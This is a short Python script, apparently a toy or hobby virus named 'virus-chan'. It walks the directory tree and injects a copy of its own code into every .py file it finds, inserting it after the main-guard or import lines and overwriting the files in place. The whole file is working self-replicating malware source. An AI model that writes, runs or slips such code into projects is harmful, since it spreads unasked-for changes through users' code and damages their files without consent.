#!/usr/bin/env python

if __name__ == "__main__":
    import os
    print('virus-chan activated')
    payload = ['    import os\n', "    print('virus-chan activated')\n", '    payload = [\'    import os\\n\', "    print(\'virus-chan activated\')\\n", "    payload = \'print(\\\\\'Tis\\\\\\\\\\\\\' nothing but a scratch!\\\\\')\\\\n\'\\n", "    indentation = \'    \'\\n", "    for (root,dirs,files) in os.walk(\'.\', topdown=True):\\n", \'        for victim in files:\\n\', "            if(root == \'.\' and victim == os.path.basename(__file__)):\\n", "                with open(root + \'/\' + victim,\'r\') as f:\\n", \'                    print(f.readlines())\\n\', \'                continue\\n\', "            if(victim[-3:] == \'.py\'):\\n", \'                infected = False\\n\', \'                print(root)\\n\', \'                print(victim)\\n\', \'                lines = []\\n\', "                with open(root + \'/\' + victim,\'r\') as f:\\n", \'                    print(lines)\\n\', \'                    lines = f.readlines()\\n\', \'                    if(payload in "".join(lines)):\\n\', \'                        continue\\n\', \'                    if( \\\'if __name__ == "__main__":\\\' in "".join(lines)):\\n\', \'                        index = lines.index( \\\'if __name__ == "__main__":\\\\n\\\')\\n\', \'                        print(index)\\n\', \'                        lines.insert(index+1, indentation+payload)\\n\', \'                    else:\\n\', \'                        for index,i in enumerate(lines):\\n\', "                            if(i[0:6] == \'import\' or i[0:4] == \'from\'):\\n", \'                                continue\\n\', \'                            lines.insert(index+1,payload)\\n\', \'                            break\\n\', "                with open(root + \'/\' + victim,\'w\') as f:\\n", \'                    f.writelines(lines)\\n\']\n', "    indentation = '    '\n", "    for (root,dirs,files) in os.walk('.', topdown=True):\n", '        for victim in files:\n', "            if(root == '.' and victim == os.path.basename(__file__)):\n", "                with open(root + '/' + victim,'r') as f:\n", '                    print(f.readlines())\n', '                continue\n', "            if(victim[-3:] == '.py'):\n", '                infected = False\n', '                print(root)\n', '                print(victim)\n', '                lines = []\n', "                with open(root + '/' + victim,'r') as f:\n", '                    print(lines)\n', '                    lines = f.readlines()\n', '                    if("".join(payload) in "".join(lines) or "".join([i[4:] for i in payload]) in "".join(lines)):\n', '                        continue\n', '                    if( \'if __name__ == "__main__":\' in "".join(lines)):\n', '                        index = lines.index( \'if __name__ == "__main__":\\n\')\n', '                        print(index)\n', '                        lines.insert(index+1,"".join(payload))\n', '                    else:\n', '                        for index,i in enumerate(lines):\n', "                            if(i[0:6] == 'import' or i[0:4] == 'from'):\n", '                                continue\n', '                            lines.insert(index+1,"".join([i[4:] for i in payload]))\n', '                            break\n', "                with open(root + '/' + victim,'w') as f:\n", '                    f.writelines(lines)\n']
    indentation = '    '
    for (root,dirs,files) in os.walk('.', topdown=True):
        for victim in files:
            if(root == '.' and victim == os.path.basename(__file__)):
                with open(root + '/' + victim,'r') as f:
                    print(f.readlines())
                continue
            if(victim[-3:] == '.py'):
                infected = False
                print(root)
                print(victim)
                lines = []
                with open(root + '/' + victim,'r') as f:
                    print(lines)
                    lines = f.readlines()
                    if("".join(payload) in "".join(lines) or "".join([i[4:] for i in payload]) in "".join(lines)):
                        continue
                    if( 'if __name__ == "__main__":' in "".join(lines)):
                        index = lines.index( 'if __name__ == "__main__":\n')
                        print(index)
                        lines.insert(index+1,"".join(payload))
                    else:
                        for index,i in enumerate(lines):
                            if(i[0:6] == 'import' or i[0:4] == 'from'):
                                continue
                            lines.insert(index+1,"".join([i[4:] for i in payload]))
                            break
                with open(root + '/' + victim,'w') as f:
                    f.writelines(lines)